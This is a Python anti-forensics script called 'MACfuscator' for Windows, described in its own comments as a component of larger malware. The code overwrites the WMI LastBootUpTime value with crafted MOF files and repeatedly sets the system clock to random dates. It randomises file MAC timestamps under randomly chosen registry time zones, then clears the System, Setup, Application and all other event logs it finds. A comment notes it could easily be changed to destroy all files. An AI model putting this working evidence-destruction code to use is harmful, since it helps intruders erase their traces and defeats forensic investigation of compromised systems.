#MACfuscator - Obscuring MAC/Timeline analysis for Windows
#Joe Avanzato, joeavanzato@gmail.com
#Retrieves specific event log, reads first entry and gets time/date, uses that with current time/date to set boundaries on number generation
#This insures relatively realistic numbers are displayed rather than impossible datetimes which may be easily filtered (To far in past/future, etc)
#Attempts to clear System, Security, Setup and Application Logs upon completion -iterates through log list to attempt and find others 
#Setup on limited while loop, in reality would most likely be terminated upon other function completion as part of larger malware
#Tries to modify LastBootUpTime via powershell script
#Date generation has basic boundary logic but many fringe cases will fail/look odd - moonth isn't checked to bound day-number for instance 
#Utilizes pywin32 as external dependency, built on python 3.6+

import os, datetime, time, _winapi, win32api, win32evtlog, random, subprocess, sys, stat, pywintypes, win32file, winreg
from win32file import CreateFile, SetFileTime, GetFileTime, CloseHandle, GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING
from pywintypes import Time

#OS for manipulating directory stuff
#Time for...sleep functionality
#_Winapi,win32api, win32evtlog for interacting with native windows functions (pywin32)
#random for generating random ints for datetime applications
#subprocess - for calling powershell from python
#sys for something I forget what now
#ntpath was used for extracting basename from path/extension, better solution woth os.path.splittext
#pywintipes for time c_struct for modifying c-time
#win32file lets me do all kinds of fun stuff with time stamps
#stat for some basic computations

global startdate
global starttime
global enddate
global endtime

def getRandomDate(): #Returns 6 integers with random values representing year, month, day, hour, minute and second (could also do millisecond or anything else)
    y = random.randint(1990,2017) #Checks if generated year = oldest detected year, sets month/day bounds appropriately - does not account for some fringe cases
    if (y == startdate.year):
        m = random.randint(startdate.month,12) #If generated month = start month, then don't go past start day :)
        if (m == startdate.month):
            ms = random.randint(0,999)
            s = random.randint(1,59)
            mi = random.randint(1,59)
            h = random.randint(1,23)
            d = random.randint(startdate.day,28)
        else:
            ms = random.randint(0,999)
            s = random.randint(1,59)
            mi = random.randint(1,59)
            h = random.randint(1,23)
            d = random.randint(1,28)
            m = random.randint(1,12)
    else:
        ms = random.randint(0,999)
        s = random.randint(1,59)
        mi = random.randint(1,59)
        h = random.randint(1,23)
        d = random.randint(1,28)
        m = random.randint(1,12)
    return(str(d)+"."+str(m)+"."+str(y)+" "+str(h)+":"+str(mi)+":"+str(s))

pathcur = os.getcwd()
#yyyymmddHHMMSS.mmmmmm-+UUU is format for LastBootUpTime as pulled from Windows Management Instrumentation (WMI) and CIM_OperatingSystem Class

def writePS(): #Writes out powershell script to retrieve LastBootUpTime from cim_operatingsystem class
    try:
        with open("unfair.ps1", 'w') as f: #Tries to write file
            f.write("$bt = gcim cim_operatingsystem\n")#
            f.write("$bt.LastBootUpTime")
    except OSError:
        print("Failed to write unfair.ps1")


def writeMOF():
    ms = random.randint(100,999)
    s = random.randint(10,59)
    mi = random.randint(10,59)
    h = random.randint(10,23)
    d = random.randint(10,28)
    m = random.randint(10,12)
    y = random.randint(2017,2017)
    lbut = str(y)+str(m)+str(d)+str(h)+str(mi)+str(s)+"."+"111010"+"+"+str(ms)
    #print(lbut)
    try:
        with open("toobad.mof", 'w') as f: #Tries to write Managed Object Format class overwriting CIM_OperatingSystem with one value for LastBootUpTime
            f.write("#pragma namespace (\"\\\\\\\\.\\\\root\\\\CIMv2\")\n")#Sets proper namespace
            #f.write("#pragma autorecover\n") #pragma preprocessor autorecover sets file in registry key HKLM\SOFTWARE\Microsoft\WBEM\CIMOM\autorecover mofs for list of files automatically rebuilt upon OS start
            f.write("class CIM_OperatingSystem\n")
            f.write("{\n")
            f.write("    [key] datetime LastBootUpTime;\n")
            f.write("};\n")
            f.write("[DYNPROPS]\n")
            f.write("instance of CIM_OperatingSystem\n")
            f.write("{\n")
            f.write("    LastBootUpTime = "+"\""+lbut+"\";\n")
            f.write("};\n")
        print("Random MOF Class Generated...")
        print("")
    except OSError:
        print("Failed to write toobad.mof")
    #20130901111111.111111+111 - DateTime format for LastBootUpTime

def randomizeFileTime(file): #uses os.utime to set a+m times and pywin_cstructs to set file creation times
    name = os.path.basename(file)
    rd = getRandomDate()
    at = random.randint(200000000, 1000050000)
    mt = random.randint(200000000, 1000050000)
    os.utime(file, (at, mt))
    ctimeform = "%d.%m.%Y %H:%M:%S"
    off = 0
    ct = time.localtime(time.mktime(time.strptime(rd, ctimeform))) #prepares time in format specified
    tmp = CreateFile(file, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, 0)
    newct = Time(time.mktime(ct))
    SetFileTime(tmp, newct)
    CloseHandle(tmp)
    print(name)

startdir = os.getcwd()
logdir = "C:\Windows\System32\winevt\Logs"

pcname = "localhost" # host name (could use over network...)
type = "System" # Application, Security, Setup, System, Forwarded Events - TYPE is initial log scanned for time-frame setup

handle = win32evtlog.OpenEventLog(pcname, type) #Sets OpenEventLog up for ReadEventLog
readtype = win32evtlog.EVENTLOG_FORWARDS_READ|win32evtlog.EVENTLOG_SEQUENTIAL_READ #Reads log from first item in order, first being earliest dated record typically
sum = win32evtlog.GetNumberOfEventLogRecords(handle) #Gets total events in log -not used crrently


writePS()
print("")
print("Original LastBootUpTime stored value...")
try: #Tries to run PowerShell - prints LastBootUpTime
    subprocess.Popen(['powershell.exe',"./unfair.ps1"], stdout = sys.stdout) #change for stealth later
except OSError:
    print("PowerShell Scripting Disabled!") #testing
time.sleep(1)


print("")
#print("Original LastBootUpTime")
#try: #PowerShell for LastBootUpTime
#    subprocess.Popen(['powershell.exe',"./unfair.ps1"], stdout = sys.stdout) #change for stealth later
#except OSError:
#    print("PowerShell Scripting Disabled!") #testing
time.sleep(1)
writeMOF()
try: #Tries to compile toobad.mof, overwriting CIM__OperatingSystem Class with new LastBootUpTime datetime
    subprocess.call('mofcomp -class:forceupdate  toobad.mof', shell=True) #Compiles previously created MOF to overwrite LBUT
except OSError:
    print("Couldn't reach cmd.exe or toobad!") #testing

time.sleep(1)
print("")
print("Modified LastBootUpTime stored values...")
try: #Tries to run PowerShell - prints LastBootUpTime
    subprocess.Popen(['powershell.exe',"./unfair.ps1"], stdout = sys.stdout) #change for stealth later
except OSError:
    print("PowerShell Scripting Disabled!") #testing
time.sleep(1)

while True: #Loop getting first record in log (earliest) -COULD ALSO USE GETEARLIESTRECORD IF THIS BEGINS TO FAIL...
    eventlist = win32evtlog.ReadEventLog(handle, readtype, 0) #Can handle many parameters- specifies log, how to read it and offset to start at
    if eventlist:
        for event in eventlist:
            print ('Earliest datetime found in Event Logs :', event.TimeGenerated)
            start = event.TimeGenerated
            break
    break

starttime = datetime.datetime.time(start) #Gets first event from specified log and uses that with current date/time to set boundaries on number generation
startdate = datetime.datetime.date(start)
enddate = datetime.datetime.date(datetime.datetime.now())
endtime = datetime.datetime.time(datetime.datetime.now())
print("")
print("STARTING DATE "+str(startdate)) #Only year incorporated - need to add if/checks for generated date to tell first year from any other in order to specify dates
print("STARTING TIME "+str(starttime)) #Not really used right now
print("ENDING DATE "+str(enddate))
print("ENDING TIME "+str(endtime))
print("")
count = 0
while True:

    count = count + 1
    y = random.randint(startdate.year,2017) #Checks if generated year = oldest detected year, sets month/day bounds appropriately - does not account for some fringe cases
    if (y == startdate.year): #Year
        m = random.randint(startdate.month,12) #If generated month = start month, then don't go past start day :)
        if (m == startdate.month): #Month
            ms = random.randint(0,999) #Millisecond
            s = random.randint(1,59) #Second
            mi = random.randint(1,59) #Minutes
            h = random.randint(1,23) #Hours
            d = random.randint(1,28) #Day of Month
            dw = random.randint(1,7) #Day of Week - Logic Inconsistencies
        else:
            ms = random.randint(0,999)
            s = random.randint(1,59)
            mi = random.randint(1,59)
            h = random.randint(1,23)
            d = random.randint(1,28)
            dw = random.randint(1,7)
            m = random.randint(1,12)
    else:
        ms = random.randint(0,999)
        s = random.randint(1,59)
        mi = random.randint(1,59)
        h = random.randint(1,23)
        d = random.randint(1,28)
        dw = random.randint(1,7)
        m = random.randint(1,12)
    #subprocess.Popen('powershell.exe [Get-WmiObject -Class win32_operatingsystem -Property LastBootUpTime $bt = Get-WmiObject -Class win32_operatingsystem Write-Output ($bt)]'  #Call powershell script to get/set LastBootUpTime and UpTime
    win32api.SetSystemTime(y, m, dw, d, h, mi, s, ms)
    time.sleep(.01)
    #dyntime = str(datetime.datetime.time(datetime.datetime.now())) #Concatenates generated time
    #dyndate = str(datetime.datetime.date(datetime.datetime.now())) #Concatenates generated date
    #print(dyndate+" "+dyntime) #displays generated datetime
    if (count == 500):
       break
time.sleep(.5)

####Getting list of logical drives, looping through contents to 'timestomp'
#drive = [A:\, B:\, C:\, D:\, E:\, F:\, G:\, H:\, I:\, J:\, K:\, L:\, M:\, N:\, O:\, P:\, Q:\, R:\, S:\, T:\, U:\, V:\, W:\, X:\, Y:\, Z:\]
#drive = ["A:\", "B:\", "C:\", "D:\", "E:\", "F:\", "G:\", "H:\", "I:\", "J:\", "K:\", "L:\", "M:\", "N:\", "O:\", "P:\", "Q:\", "R:\", "S:\", "T:\", "U:\", "V:\", "W:\", "X:\", "Y:\", "Z:\"]
x = 0
while (x < 26):
    try:
        try:
            #testpath = str(drive[x]+"Windows")
            if (os.path.exists("C:\Windows") == 1):
                #windrive = drive[x]
                print("Windows Logical Drive Detected")
                print("")
                break
        except OSError:
            print("OS Error")
            #print("Error Interpreting "+drive[x])
    except OSError:
        x = x + 1
        #print(drive[x]+":/Windows Not Found!")

#testdir = "C:\\Users\\Joe\\Documents\\Classes Fall 2017\\Demo" #For demo purposes

#os.chdir(testdir)
os.chdir(startdir)
tzpath = r"SYSTEM\CurrentControlSet\Control\TimeZoneInformation" #TimeZoneKeyName location, line below prepares all typical time-zones as strings for value storage
tz = ["Dateline","Samoa","Hawaiian","Alaskan","Pacific","Mountain","U.S. Mountain","Central","Canada Central","Mexico","Central America","Eastern","U.S. Eastern", "S.A. Pacific","Atlantic", "S.A. Western","Pacific S.A.", "Newfoundland and Labrador", "E. South America", "S.A. Eastern","Greenland","Mid-Atlantic","Azores","Cape Verde","GMT","Greenwich","Central Europe","Central European","Romance","W. Europe","W. Central Africa","E. Europe","Egypt","FLE","GTB","Israel","South Africa","Russian","Arab","E. Africa","Arabic","Iran","Arabian","Caucasus","Transitional Islamic State of Afghanistan","Ekaterinburg","West Asia","India","Nepal","Central Asia","Sri Lanka","N. Central Asia","Myanmar","S.E. Asia","North Asia","China","Singapore","Taepie","W. Australia","North Asia East","Korea","Tokyo","Yakutsk","A.U.S. Central","Cen. Australia","A.U.S. Eastern","E. Australia","Tasmania","Vladivostok","West Pacific","Central Pacific","Fiji Islands","New Zealand","Tonga"]
lentz = len(tz) #Gets Length

testfiles = os.listdir()
for file in testfiles:
    try:
        ran = random.randint(0,(lentz - 1)) #Index list 0-(l-1)
        seltz = tz[ran] #Get random Time-Zone
        print("Random Timezone : "+seltz)
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, tzpath) #Open TimeZoneInformation Key
        tzkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, tzpath, 0, winreg.KEY_WRITE) #Open for Writing
        winreg.SetValueEx(tzkey, "TimeZoneKeyName", 0, winreg.REG_SZ, seltz) #Change Value of Open Key
        winreg.CloseKey(tzkey) #Close it
    except OSError:
        print("Error Modifying Registry")
    try:
        randomizeFileTime(file) #send file to destroy MAC attributes under random time-zone
    except OSError:
        print("Error Reading "+file)
print("MAC Times Randomized for Above Files")

#win32evtlog.ReadEventLog(handle, readtype, 0) 
win32evtlog.ClearEventLog(handle, None)
win32evtlog.CloseEventLog(handle)

###Guarantees basic logs wiped
type2 = "Security"
type3 = "Setup"
type4 = "Application"

#handle2 = win32evtlog.OpenEventLog(pcname, type2)
#win32evtlog.ReadEventLog(handle2, readtype, 0) 
#win32evtlog.ClearEventLog(handle2, None)
#print("Security Log Cleared")
handle3 = win32evtlog.OpenEventLog(pcname, type3)
win32evtlog.ReadEventLog(handle3, readtype, 0) 
win32evtlog.ClearEventLog(handle3, None)
win32evtlog.CloseEventLog(handle3)
print("")
print("Setup Log Cleared")
handle4 = win32evtlog.OpenEventLog(pcname, type4)
win32evtlog.ReadEventLog(handle4, readtype, 0) 
win32evtlog.ClearEventLog(handle4, None)
win32evtlog.CloseEventLog(handle4)

########Tries to use ClearEventLog on all Event logs in typical directory 
os.chdir(logdir)
loglist = os.listdir()
for log in loglist:
    log = os.path.splitext(log)[0]
    #print(log)
    x = str(log)
    x = x.replace("%4","_")
    #print(x)
    test = win32evtlog.OpenEventLog("localhost", x)
    try:
        temp = win32evtlog.ReadEventLog(test, readtype, 0)
        total = win32evtlog.GetNumberOfEventLogRecords(test)
        if (total == 0):
            print(x+" has no events!")
            pass
        else:
            win32evtlog.ClearEventLog(test, None)
            win32evtlog.CloseEventLog(test)
            print(x+" log cleared")
    except:
        print("Error Reading "+x)

print("")
old_stdout = sys.stdout
print("Logs Wiped Via 'ClearEventLog'...")
a = 0
while (a < 11):
    a = a + 1
    writeMOF()
    sys.stdout = open(os.devnull, 'w')
    try: #Tries to compile toobad.mof, overwriting CIM__OperatingSystem Class with new LastBootUpTime datetime
        subprocess.call('mofcomp toobad.mof', shell=True) #Compiles previously created MOF to overwrite LBUT
    except OSError:
        print("Couldn't reach cmd.exe or toobad.mof!") #testing
#os.remove("toobad.mof")
sys.stdout = old_stdout
print("LastBootUpTime Garbage Added")

##############

#Below tries to wipe log files via manual open, automatically overwriting the contents with a blank file(Not going to work on normal user account) -Could easily modify to simply destroy ALL files
#os.chdir(logdir)
#loglist = os.listdir()
#for log in loglist:
#    try:
#        with open(log, 'w'): pass
#        print("Emptying "+log+" Via Manual Overwrite")
#    except OSError:
#        print("Error Reading "+log)

os.chdir(startdir)
############

#try:
    #os.remove("NULL")
#except OSError:
    #print("")
